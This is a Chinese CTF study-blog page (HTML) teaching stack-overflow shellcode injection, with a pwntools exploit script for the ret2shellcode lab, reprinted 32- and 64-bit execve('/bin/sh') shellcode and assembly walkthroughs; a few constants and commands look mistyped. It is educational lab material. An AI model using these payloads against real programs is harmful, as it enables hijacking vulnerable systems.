@@ -1,0 +1,939 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Pwn基础----shellcode, F0und">
+    <meta name="description" content="Pwn学习   —— shellcode0x10 shellcode－－修改返回地址，让其指向溢出数据中的一段指令
+根据上面副标题的说明，要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Pwn基础----shellcode | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，明天变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Pwn基础----shellcode
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-02-17
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        7 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Pwn学习-——-shellcode"><a href="#Pwn学习-——-shellcode" class="headerlink" title="Pwn学习   —— shellcode"></a>Pwn学习   —— shellcode</h1><h2 id="0x10-shellcode"><a href="#0x10-shellcode" class="headerlink" title="0x10 shellcode"></a>0x10 shellcode</h2><p><em>－－修改返回地址，让其指向溢出数据中的一段指令</em></p>
+<p>根据上面副标题的说明，要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开 shell，从而可以获得当前进程的控制权，所以这类指令片段也被成为“shellcode”。下面我们先写出溢出数据的组成，再确定对应的各部分填充进去。</p>
+<p><strong>payload :</strong> padding1 + address of shellcode + padding2 + shellcode</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220140.png" alt="图1 payload图解"></p>
+<h2 id="0x20-shellcode-payload"><a href="#0x20-shellcode-payload" class="headerlink" title="0x20 shellcode payload"></a>0x20 shellcode payload</h2><p>padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式。</p>
+<p>根据上面的构造，我们要解决两个问题。</p>
+<ol>
+<li>返回地址之前的填充数据（padding1）应该多长？</li>
+</ol>
+<p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p>
+<ol>
+<li>shellcode起始地址应该是多少？</li>
+</ol>
+<p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p>
+<p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p>
+<p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220141.png" alt="图2 payload"></p>
+<p>这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。</p>
+<h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>本题同样来自于ctf-wiki\challengespwn\stackoverflow\ret2shellcode</p>
+<p>题目源码</p>
+<pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>
+#include <string.h>
+
+char buf2[100];
+
+int main(void)
+{
+    setvbuf(stdout, 0LL, 2, 0LL);
+    setvbuf(stdin, 0LL, 1, 0LL);
+
+    char buf[100];
+
+    printf("No system for you this time !!!\n");
+    gets(buf);
+    strncpy(buf2, buf, 100);//将 buf传给buf2
+    printf("bye bye ~");
+
+    return 0;
+}
+</code></pre>
+<p>编译命令：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -fno-stack-protector//关闭cannary nx保护
+</code></pre>
+<p>程序关闭了nx保护这就意味着我们输入栈中的数据变得可以执行</p>
+<p>这也就是说，如果我们输入的是一段汇编指令也会被执行</p>
+<p>在本题中，我们就可以在：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+
+                                           |     retaddr     |
+                                           +-----------------+
+                                           |     saved ebp   |
+                                    ebp--->+-----------------+
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                            buf,ebp-0xc---->+-----------------+
+</code></pre>
+<p>那么如果我们读取字符串：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">0x6c*'a'+'bbbb'+success_addr//success_addr为我们想要跳转的地址
+</code></pre>
+<blockquote>
+<p>为什么是0x6c而不是ida里说的0x64？</p>
+</blockquote>
+<p>主要是因为IDA里出来的偏移量并不是每次都是准确的，需要我们用GDB手动来调试（网上是这样说的，我查了一下午，，，）</p>
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+
+                                           |  success_addr   |
+                                           +-----------------+
+                                           |       bbbb      |
+                                    ebp--->+-----------------+
+                                           |                 |
+                                           |                 |
+                                           | 'a'*0x6c        |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                              s,ebp-0x64-->+-----------------+
+</code></pre>
+<p>由于存在strncpy（buf2,buf,100）,因此我们可以把shellcode通过buf写入到buf2中，然后我们知道buf2的地址，即：buf2的地址就是shellcode的起始地址，我们在将返回地址修改为buf2的地址，程序没有开启NX,程序数据中的shellcode可以执行，返回shell</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">from pwn import *
+
+sh=process('./ret2shellcode')
+
+#这里使用的是pwntools自带的shellcode生成的，也可以使用网上的
+#asm(shellcraft.sh()) //将shellcode汇编为汇编代码
+shellcode=asm(shellcraft.sh())
+buf2_addr=0x0804A080
+
+payload=shellcode.ljust(0x6c+0x4,'a')+p32(buf2_addr)
+
+sh.sendafter(""No system for you this time !!!\n"",payload)
+
+sh.interactive()
+</code></pre>
+<h2 id="0x40-shellcode-example-of-32-and-64"><a href="#0x40-shellcode-example-of-32-and-64" class="headerlink" title="0x40 shellcode example of 32 and 64"></a>0x40 shellcode example of 32 and 64</h2><p>shellcode32:</p>
+<pre class=" language-lang-shell"><code class="language-lang-shell">/*
+ -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes -------------------------
+ *  AUTHOR : Tosh
+ *   OS    : BSDx86 (Tested on FreeBSD 8.1)
+ *   EMAIL : tosh@tuxfamily.org
+ */
+
+#include <string.h>
+#include <stdio.h>
+
+
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+                   "\x54\x53\xb0\x3b\x50\xcd\x80";
+
+int main(void)
+{
+   void(*f)() = (void*)shellcode;
+
+   printf("Len = %d\n", sizeof(shellcode)-1);
+   f();
+}
+
+/*!
+ %define SYS_EXECV 59
+
+
+section .text
+
+global _start
+
+_start:
+   xor eax, eax
+
+   push eax
+
+   push '//sh'
+   push '/bin'
+
+   mov ebx, esp
+
+   push eax
+   push esp
+   push ebx
+   mov al, SYS_EXECV
+   push eax
+   int 0x80
+*/
+</code></pre>
+<p>shellcode64:</p>
+<pre class=" language-lang-shell"><code class="language-lang-shell">/** 
+ *
+ *   _   _            _            ____       _ _ 
+ *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | |
+ *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | |
+ *  |  _  | (_| | (__|   <| | | | |  _ < (_) | | |
+ *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_|
+ *           [ http://www.hacknroll.com ]
+ *
+ * Description:
+ *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes
+ *
+ *
+ *
+ * Authors:
+ *    Maycon M. Vitali ( 0ut0fBound )
+ *        Milw0rm .: http://www.milw0rm.com/author/869
+ *        Page ....: http://maycon.hacknroll.com
+ *        Email ...: maycon@hacknroll.com
+ *
+ *    Anderson Eduardo ( c0d3_z3r0 )
+ *        Milw0rm .: http://www.milw0rm.com/author/1570
+ *        Page ....: http://anderson.hacknroll.com
+ *        Email ...: anderson@hacknroll.com
+ * 
+ * -------------------------------------------------------
+ *   
+ * amd64# gcc hacknroll.c -o hacknroll
+ * amd64# ./hacknroll
+ * # exit
+ * amd64#
+ *
+ * -------------------------------------------------------
+ */
+
+const char shellcode[] =
+        "\x48\x31\xc0"                               // xor    %rax,%rax
+        "\x99"                                       // cltd
+        "\xb0\x3b"                                   // mov    $0x3b,%al
+        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
+        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
+        "\x57"                                       // push   %rdi
+        "\x48\x89\xe7"                               // mov    %rsp,%rdi
+        "\x57"                                       // push   %rdi
+        "\x52"                                       // push   %rdx
+        "\x48\x89\xe6"                               // mov    %rsp,%rsi
+        "\x0f\x05";                                  // syscall
+
+int main(void)
+{
+        (*(void (*)()) shellcode)();
+        return 0;
+}
+</code></pre>
+<p>shellcodeDB: <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>
+<h2 id="0x50-shellcode64位汇编指令解析"><a href="#0x50-shellcode64位汇编指令解析" class="headerlink" title="0x50 shellcode64位汇编指令解析"></a>0x50 shellcode64位汇编指令解析</h2><p>前置知识</p>
+<p>64位函数参数传递方式：<a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</a></p>
+<p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">_start:
+    xor rax,rax        ;clear rax
+    add rax,0x3b    ;syscall_64.tbl
+    xor rdi,rdi        ;clear rdi
+    push rdi
+    mov rdi,0x68732f26e69622f    ;hs//nib/==>bin/sh写入rdi
+    push rdi        ;push stark(rsp-=8) 现在rsp==>bin/sh
+    lea rdi,[rsp]    ;rdi=rsp(%rdi,%rsi,%rdx,%rcx,%r8,%r9用作函数参数，依次对应第一、第二参数)取bin/sh的地址放到rdi里
+    xor rsi,rsi        ;clear rsi
+    xor rdx,rdx        ;clear rdx
+    syscall
+</code></pre>
+<p>编译命令：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">nasm -f elf64 shasm.asm -o shasm.o 编译汇编程序，elf64指定文件类型
+ld -s -o shasm shasm.o  链接目标文件
+objcopy -O binary shasm.o.code 提取其中的shellcode部分
+xxd code 显示方便
+</code></pre>
+<h2 id="0x60-pwntoos-shellcraft-sh"><a href="#0x60-pwntoos-shellcraft-sh" class="headerlink" title="0x60 pwntoos shellcraft.sh()"></a>0x60 pwntoos shellcraft.sh()</h2><pre class=" language-lang-txt"><code class="language-lang-txt">/* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */ ==>0x68732f26e69622f
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f        
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+</code></pre>
+<p>int 0x80在linux中用来处理system_call,int表示中断，数字0x80是中断号。 中断将程序stream传送给正在处理该中断的人，在这种情况下，中断为0x80。 在Linux中，0x80中断处理程序是内核，用于由其他程序对内核进行系统调用.</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/02/18/ctf/pwn/pwn-shellcode/" class="b-link-green">Pwn基础----shellcode</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/02/18/ctf/pwn/pwn-rop/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Pwn基础----ROP">
+                        
+                        <span class="card-title">Pwn基础----ROP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">ROP  (Return Oriented Programming)0x00 ROP－－修改返回地址，让其指向内存中已有的一段指令
+根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/18/ctf/pwn/pwn-basic/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="Pwn基础----保护机制(checksec)">
+                        
+                        <span class="card-title">Pwn基础----保护机制(checksec)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">PWN学习记录CTF中pwn的保护机制（常见的）
+GCC编译时保护的开关：
+
+NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了
+Canary：-fn</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">29.4k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
